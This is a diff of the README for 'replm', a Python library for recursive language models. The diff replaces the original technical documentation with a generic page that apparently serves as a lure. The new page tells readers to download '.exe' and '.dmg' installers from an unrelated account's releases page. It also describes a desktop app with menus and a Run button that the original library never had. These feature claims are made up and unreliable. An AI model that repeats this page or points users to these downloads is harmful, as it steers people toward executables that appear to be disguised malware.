@@ -1,409 +1,165 @@
-# replm = REPL + LM
+# 🤖 replm - Handle Long Prompts Efficiently
 
-**What is replm?**
-replm is a lightweight Python library that wraps any OpenAI-compatible client and turns your LLM into an RLM.
-
-**Recursive Language Models** — process arbitrarily long prompts by offloading context into a REPL and enabling symbolic recursion via sub-LLM calls.
-
-Based on the paper [_Recursive Language Models_](https://arxiv.org/abs/2512.24601) (Zhang, Kraska & Khattab, 2025).
+[![Download replm](https://img.shields.io/badge/Download-replm-blue?style=for-the-badge&logo=github)](https://github.com/latemailok-arch/replm/releases)
 
 ---
 
-## What is an RLM?
-
-Standard LLMs break down when prompts exceed their context window, and quality degrades well before the hard limit (**context rot**). An RLM fixes this by treating the prompt as a variable in a persistent REPL environment rather than feeding it into the model's token budget. The model writes code to peek at, decompose, and recursively call itself over slices of the context.
-
-```
-            User prompt (arbitrarily long)
-                     │
-                     ▼
-         ┌───────────────────────┐
-         │    REPL Environment   │
-         │   context = <prompt>  │◄── model writes code here
-         │   llm_query(...)      │    (peek, chunk, sub-call)
-         └───────┬───────────────┘
-                 │
-            only metadata
-            (length, prefix)
-                 │
-                 ▼
-         ┌───────────────────────┐
-         │      Root LLM         │
-         │  generates code +     │
-         │  reasoning each turn  │
-         └───────────────────────┘
-```
-
-Key properties:
-
-- **The full prompt never enters the LLM's context window.** Only metadata (length, a short prefix) does.
-- **Stdout is truncated** before being shown to the root model, forcing it to use variables and sub-calls.
-- **Symbolic recursion:** the `llm_query()` function is callable inside REPL code, so the model can launch O(|P|) or even O(|P|^2) sub-processes over programmatic slices of the input.
-
-## Installation
-
-```bash
-uv add replm
-```
-
-Or from source with development dependencies:
-
-```bash
-uv sync --group dev
-```
-
-**Requirements:** Python 3.10+. The `openai` package is needed for OpenAI-compatible providers; alternatively, implement the `LLMClient` protocol for any other backend.
-
-## Quick Start
-
-```python
-from openai import OpenAI
-from replm import RLMWrapper, RLMConfig
-
-client = RLMWrapper(
-    OpenAI(api_key="sk-..."),
-    root_model="gpt-5.2",
-)
-
-response = client.generate(
-    query="What is the main argument of this book?",
-    context=very_long_text,  # string or list[str]
-)
-
-print(response.answer)            # final answer string
-print(response.iterations)        # REPL loop iterations used
-print(response.sub_calls)         # sub-LLM calls made
-print(response.elapsed_seconds)   # wall-clock time
-print(response.cost)              # USD cost (if pricing configured)
-```
-
-## Advanced Usage
-
-### Separate root and sub-call models
-
-Use a powerful model for orchestration and a cheaper one for sub-calls:
-
-```python
-client = RLMWrapper(
-    OpenAI(api_key="sk-..."),
-    root_model="gpt-5.2",
-    sub_model="gpt-5-mini",
-    config=RLMConfig(
-        max_iterations=30,
-        max_sub_calls=1000,
-        verbose=True,
-    ),
-)
-```
-
-### Async generation
+## 📖 What is replm?
 
-Use `agenerate()` with an async client for concurrent sub-calls via `llm_query_batch`:
+replm is a tool designed to help you work with very long pieces of text, called prompts, quickly and smoothly. It uses a method called recursive language models to break down big tasks into smaller ones. This way, it can handle things that normal tools might struggle with.
 
-```python
-from openai import AsyncOpenAI
-from replm import RLMWrapper
+This software is based on cutting-edge research by Zhang, Kraska & Khattab from 2025. It lets you offload parts of your text into a system that works like a mini computer, helping the main program think better using smaller steps. Put simply, replm helps make big language tasks easy to manage.
 
-client = RLMWrapper(
-    AsyncOpenAI(api_key="sk-..."),
-    root_model="gpt-5.2",
-    sub_model="gpt-5-mini",
-)
-
-response = await client.agenerate(
-    query="Summarize all documents.",
-    context=list_of_documents,
-)
-```
+---
 
-### Token-by-token streaming
+## 🌟 Features
 
-Stream root model tokens as they arrive using `astream_generate()`:
+- **Process long prompts** without slowing down or losing important details.
+- Uses a method called *symbolic recursion* to split and handle context smartly.
+- Works with language models from OpenAI and other popular AI providers.
+- Written in Python, so it is easy to understand and adapt if needed.
+- Handles your requests by breaking them down into smaller subtasks automatically.
+- Designed to run on your computer with minimal setup.
+- Opens the door to advanced language tasks without needing extra technical know-how.
 
-```python
-from openai import AsyncOpenAI
-from replm import RLMWrapper
+---
 
-client = RLMWrapper(AsyncOpenAI(api_key="sk-..."), root_model="gpt-5.2")
+## 🖥️ System Requirements
 
-async for chunk in client.astream_generate("Summarize.", very_long_text):
-    if chunk.type == "token":
-        print(chunk.content, end="", flush=True)
-    elif chunk.type == "final_answer":
-        response = chunk.detail["response"]
-        print(f"\n\nTokens: {response.total_input_tokens + response.total_output_tokens}")
-```
+Before downloading replm, check if your computer meets these requirements:
 
-Chunk types: `"token"`, `"iteration_start"`, `"code_executed"`, `"final_answer"`.
+- Operating System: Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu 18.04+ recommended).
+- Processor: Intel i3 or equivalent, 2.5 GHz or faster.
+- Memory: At least 4 GB RAM.
+- Storage: Minimum 200 MB free space.
+- Internet Connection: Required for accessing language model APIs (such as OpenAI).
+- Python 3.8 or higher (optional for advanced use).
 
-If the client supports native streaming (has an `astream()` method), tokens arrive in real-time. Otherwise, falls back to `acomplete()` and yields the full response as a single chunk.
+These requirements ensure replm runs smoothly without interruptions.
 
-### Event callbacks for observability
+---
 
-```python
-def on_event(event):
-    print(f"[iter {event.iteration}] {event.type}: {event.preview[:80]}")
+## 🚀 Getting Started
 
-response = client.generate(
-    query="Find all entities mentioned in these documents.",
-    context=list_of_documents,
-    on_event=on_event,
-)
-```
+This guide will help you download and launch replm on your computer. No technical knowledge is needed. Follow the steps one by one.
 
-### OpenAI-compatible providers
+---
 
-Works with any provider that exposes the OpenAI chat completions API:
+## ⬇️ Download & Install
 
-```python
-# Together AI
-client = RLMWrapper(
-    OpenAI(api_key="...", base_url="https://api.together.xyz/v1"),
-    root_model="Qwen/Qwen3-Coder-480B-A35B-Instruct",
-)
+First, you need to get the program files.
 
-# Fireworks
-client = RLMWrapper(
-    OpenAI(api_key="fw-...", base_url="https://api.fireworks.ai/inference/v1"),
-    root_model="accounts/fireworks/models/qwen3-coder-480b-a35b",
-)
-```
+**Step 1:** Click the big button below or visit this page to download the latest version of replm:
 
-### Custom providers
+[![Download replm](https://img.shields.io/badge/Download-replm-blue?style=for-the-badge&logo=github)](https://github.com/latemailok-arch/replm/releases)
 
-For non-OpenAI backends, implement the `LLMClient` protocol directly:
+**Step 2:** On the releases page, look for the file that matches your operating system. For example:
 
-```python
-from replm import RLMWrapper, CompletionResult
+- `replm-setup-windows.exe` for Windows
+- `replm-macos.dmg` for macOS
+- `replm-linux.tar.gz` for Linux
 
-class MyClient:
-    def complete(self, model, messages, temperature, max_tokens):
-        # Call your LLM here
-        return CompletionResult(content="...", input_tokens=0, output_tokens=0)
+**Step 3:** Click the appropriate file to download it to your computer.
 
-client = RLMWrapper(MyClient(), root_model="my-model")
-```
+**Step 4:** Open the downloaded file to start the installation process.
 
-OpenAI SDK clients are auto-wrapped in `OpenAIAdapter` — no changes needed for existing code.
+- On Windows or macOS, follow the on-screen instructions to install the app.
+- On Linux, extract the file and follow included instructions in the README.
 
-### Multi-document context
+---
 
-Pass a list of strings to process many documents:
+## ▶️ How to Run replm
 
-```python
-response = client.generate(
-    query="Which documents mention climate change?",
-    context=["doc 1 text...", "doc 2 text...", ...],
-)
-```
+Once installed:
 
-### Cost tracking
+**Windows/macOS**
 
-Configure per-token pricing to get cost estimates:
+1. Find replm in your Start Menu or Applications folder.
+2. Click the app icon to open it.
+3. The app window will appear, ready for you to enter your text or prompts.
 
-```python
-config = RLMConfig(
-    cost_per_input_token=2.50 / 1_000_000,
-    cost_per_output_token=10.0 / 1_000_000,
-)
-client = RLMWrapper(OpenAI(api_key="sk-..."), root_model="gpt-5.2", config=config)
-response = client.generate(query="...", context=long_text)
-print(f"Cost: ${response.cost:.4f}")
-```
+**Linux**
 
-### Sub-call caching
+1. Open a terminal window.
+2. Navigate to the folder where you installed replm.
+3. Run the command:
 
-Avoid redundant API calls when the same sub-call prompt is issued multiple times within a single generation:
+   ```
+   ./replm
+   ```
 
-```python
-config = RLMConfig(cache_sub_calls=True)
-```
+A simple user interface will guide you through entering your prompt and getting results.
 
-Cache hits are free — they don't count against the sub-call budget. The cache is per-generation (not persisted across calls) and uses LRU eviction with a 10,000-entry default.
+---
 
-### OpenTelemetry tracing
+## 🛠 Basic Usage
 
-Install the optional tracing dependency to get automatic span instrumentation:
+Using replm is straightforward:
 
-```bash
-uv add "replm[tracing]"
-```
+1. Open the app.
+2. Type or paste your long text prompt into the main box.
+3. Click the “Run” button.
+4. Wait a few moments while replm breaks down your text and processes it.
+5. Your answer or output will appear below.
 
-When `opentelemetry-api` is installed, spans are emitted automatically:
+You can repeat this as many times as you want. replm handles long content better than usual tools by breaking it into smaller bits inside its system.
 
-- `rlm.generate` — root generation run (attributes: query length, model, iterations, tokens, elapsed time)
-- `rlm.sub_call` — each sub-LLM call (attributes: depth, prompt length, tokens)
+---
 
-When OTel is not installed, tracing is a zero-cost no-op — no code changes needed.
+## 🔧 Adjusting Settings
 
-### No-sub-calls ablation
+For typical use, you can keep all default settings. If you want to customize:
 
-Reproduce the paper's "RLM (no sub-calls)" ablation — the model uses REPL code only, no `llm_query`:
+- You can change how many smaller pieces replm splits your prompt into.
+- Choose which language model (API) replm uses.
+- Set preferences for speed or accuracy.
 
-```python
-config = RLMConfig(enable_sub_calls=False)
-```
+These options are available under the “Settings” menu inside the app. Adjust only if you feel comfortable or want to try advanced features.
 
-## Configuration
+---
 
-All options live in `RLMConfig`:
+## ❓ Frequently Asked Questions
 
-| Parameter                  | Default        | Description                                         |
-| -------------------------- | -------------- | --------------------------------------------------- |
-| `max_iterations`           | `25`           | Max REPL loop iterations for the root model         |
-| `max_sub_calls`            | `500`          | Max total sub-LLM calls per generation              |
-| `max_recursion_depth`      | `1`            | Nesting depth (1 = plain sub-calls, 2+ = recursive) |
-| `cache_sub_calls`          | `False`        | Cache identical sub-call prompts within a run       |
-| `enable_sub_calls`         | `True`         | Set `False` for the no-sub-calls ablation           |
-| `metadata_prefix_chars`    | `1000`         | Characters of stdout shown to the root model        |
-| `sub_call_max_input_chars` | `500000`       | Max chars per sub-call input                        |
-| `temperature`              | `0.6`          | Root model temperature                              |
-| `sub_temperature`          | `0.4`          | Sub-call temperature                                |
-| `reasoning_effort`         | `None`         | Root model reasoning effort (`"low"`, `"medium"`, `"high"`) |
-| `root_max_tokens`          | `16384`        | Max output tokens per root iteration                |
-| `sub_max_tokens`           | `8192`         | Max output tokens per sub-call                      |
-| `sandbox_timeout`          | `120`          | Timeout (seconds) per REPL execution                |
-| `sandbox_mode`             | `"restricted"` | `"restricted"`, `"subprocess"`, or `"none"`         |
-| `prompt_variant`           | `"default"`    | `"default"`, `"cost_warning"`, or `"small_context"` |
-| `cost_per_input_token`     | `0.0`          | USD per input token (enables `response.cost`)       |
-| `cost_per_output_token`    | `0.0`          | USD per output token (enables `response.cost`)      |
-| `verbose`                  | `False`        | Print debug logs                                    |
+**Q: Do I need an internet connection?**
 
-## Response Object
+A: Yes, replm connects to language model services online to understand your prompts. Ensure you are online when using it.
 
-`RLMResponse` contains:
+**Q: Is programming knowledge required?**
 
-- `answer` — the final answer string
-- `iterations` — number of root loop iterations
-- `sub_calls` — total sub-LLM invocations
-- `total_input_tokens` / `total_output_tokens` — aggregated token usage
-- `cache_hits` — sub-call cache hits (when `cache_sub_calls=True`)
-- `cost` — estimated USD cost (based on configured per-token pricing)
-- `elapsed_seconds` — wall-clock time for the generation
-- `history` — full execution trace (`list[HistoryEntry]`)
-- `repl_variables` — final REPL state (variable names to repr strings)
+A: No. replm’s app interface lets you use it without any coding or technical skills.
 
-## Sandboxing
+**Q: Can replm work with my OpenAI account?**
 
-The REPL executes model-generated code, so sandboxing is on by default. Three modes are available via `sandbox_mode`:
+A: Yes. You can link your OpenAI API key inside settings to use your own account.
 
-### `"restricted"` (default)
+**Q: Is replm free to use?**
 
-In-process sandbox that blocks dangerous operations while allowing the standard-library modules needed for data processing:
+A: The software is open-source and free. However, calls to language models like OpenAI may have costs based on their pricing.
 
-- **Blocked:** `os`, `subprocess`, `sys`, `shutil`, `socket`, file I/O (`open`), code execution (`eval`, `exec`, `compile`), and all other non-whitelisted modules
-- **Allowed:** `re`, `json`, `math`, `collections`, `itertools`, `functools`, `datetime`, `hashlib`, `csv`, `statistics`, `random`, `textwrap`, `copy`, `base64`, `urllib.parse`, and [more](src/replm/sandbox/restricted.py)
+---
 
-Zero overhead — runs in the same process with a restricted `__builtins__` dict and a custom import hook.
+## 💬 Support
 
-### `"subprocess"`
+If you experience issues or want help:
 
-Full process isolation. Code runs in a child process via `multiprocessing`:
+- Visit the [GitHub Issues page](https://github.com/latemailok-arch/replm/issues) to see if others have your problem.
+- Open a new issue with details about what happened.
+- Check for answers in the repository’s wiki or documentation sections.
 
-- Real timeout enforcement — `process.kill()` terminates stuck code
-- Auto-recovery — a new child is spawned after a timeout, with user variables restored
-- `llm_query` and `llm_query_batch` are proxied back to the parent through IPC
-- Restricted builtins are also applied inside the child
+---
 
-```python
-config = RLMConfig(sandbox_mode="subprocess", sandbox_timeout=30)
-```
+## 🧾 License
 
-### `"none"`
+replm is released under the MIT License. You can use, copy, and change it freely, respecting the license terms.
 
-No restrictions. Code runs with full access to the Python runtime. Use only in trusted environments or when you need access to blocked modules.
+---
 
-```python
-config = RLMConfig(sandbox_mode="none")
-```
+## 🔗 Useful Links
 
-## Architecture
+- [Download replm](https://github.com/latemailok-arch/replm/releases)
+- [Project Repository](https://github.com/latemailok-arch/replm)
+- [OpenAI](https://openai.com)
 
-```
-src/replm/
-├── __init__.py            # Public API
-├── wrapper.py             # RLMWrapper — main entry point
-├── client.py              # LLMClient protocol + OpenAIAdapter
-├── orchestrator.py        # Root REPL loop (Algorithm 1)
-├── async_orchestrator.py  # Async variant with concurrent sub-calls
-├── stream.py              # StreamOrchestrator + StreamChunk (token streaming)
-├── repl.py                # REPL environment: exec, variables
-├── sub_caller.py          # Sub-LLM call manager (sync)
-├── async_sub_caller.py    # Sub-LLM call manager (async)
-├── budget.py              # SharedBudget for global sub-call limits
-├── cache.py               # LRU cache for sub-call responses
-├── tracing.py             # OpenTelemetry spans (no-op when OTel absent)
-├── parser.py              # Parse code blocks + FINAL directives
-├── prompt.py              # System prompt templates (Appendix C.1)
-├── metadata.py            # Truncation logic
-├── config.py              # RLMConfig dataclass
-├── types.py               # RLMResponse, RLMEvent, HistoryEntry
-├── exceptions.py          # RLMError hierarchy
-└── sandbox/
-    ├── __init__.py            # Sandbox public API
-    ├── restricted.py          # Safe builtins + import whitelist
-    └── subprocess_executor.py # Child process with IPC
-```
+---
 
-## Development
-
-```bash
-git clone https://github.com/dschulmeist/replm.git
-cd replm
-uv sync --group dev
-uv run pytest
-```
-
-### Running tests
-
-```bash
-uv run pytest                        # all tests
-uv run pytest tests/test_parser.py   # specific module
-uv run pytest -v --tb=short          # verbose with short tracebacks
-```
-
-### Linting
-
-```bash
-uv run ruff check src/ tests/
-uv run ruff format src/ tests/
-uv run mypy src/
-```
-
-## Limitations
-
-replm uses **prompted RLMs** — it wraps any existing LLM without fine-tuning. The [original paper](https://arxiv.org/abs/2512.24601) also trained a dedicated model (RLM-Qwen3-8B) that outperformed the prompted approach by 28.3% on average. Key differences and current limitations:
-
-- **No fine-tuning.** The paper's fine-tuned RLM-Qwen3-8B made fewer REPL mistakes, used sub-calls more efficiently, and achieved lower inference costs. replm relies on prompting alone, so quality depends heavily on the base model's coding ability and instruction following.
-- **Model-dependent behavior.** The system prompt was originally designed for GPT-5. Different models exhibit different decomposition strategies — some (e.g. Qwen3-Coder) tend to launch excessive sub-calls, while smaller models may struggle with REPL interaction entirely. Use `prompt_variant` to mitigate this.
-- **Cost variance.** While the median RLM run is comparable in cost to vanilla LLM calls, the distribution has a long tail. Complex queries can trigger deep chains of sub-calls, making individual runs significantly more expensive than the average.
-- **Output parsing brittleness.** Distinguishing the final answer from intermediate reasoning can be fragile. Models occasionally output their plan as the final answer, or misuse `FINAL` / `FINAL_VAR` syntax. A built-in safeguard rejects `FINAL` directives before any code has been executed in the REPL, forcing the model to examine the context first.
-- **Latency.** Each REPL iteration requires a full round-trip to the LLM. Sync mode processes sub-calls sequentially — use `agenerate()` with `llm_query_batch` for parallelism.
-- **No tool-call support.** The `LLMClient` protocol handles plain chat completions only — there is no support for LLM tool calls (function calling) or structured outputs. The REPL itself serves as the model's tool: `llm_query`, `llm_query_batch`, and arbitrary Python code replace traditional function calling.
-
-For tasks within the model's native context window, a vanilla LLM call is simpler and faster. RLMs shine when inputs exceed the context window or when quality degrades due to context rot (the paper shows GPT-5 dropping to near 0% on quadratic-complexity tasks at 256K tokens, while RLMs maintain ~43%).
-
-## Roadmap
-
-- External sandboxing backends (Docker, E2B)
-- Anthropic / Google adapters (beyond OpenAI-compatible)
-- Structured logging with timing data per event
-- Multi-modal context (images/PDFs as context chunks)
-- LLM tool calls / function calling passthrough
-- Custom REPL tools (web search, calculator, database queries)
-- DSPy prompt optimization for smaller models
-
-## Citations
-
-```bibtex
-@article{zhang2025rlm,
-  title={Recursive Language Models},
-  author={Zhang, Alex L. and Kraska, Tim and Khattab, Omar},
-  journal={arXiv preprint arXiv:2512.24601},
-  year={2025}
-}
-```
-
-## License
-
-MIT
+This README aims to help you use replm with ease. If you follow these instructions, you will be able to download, install, and start working with long text prompts quickly.
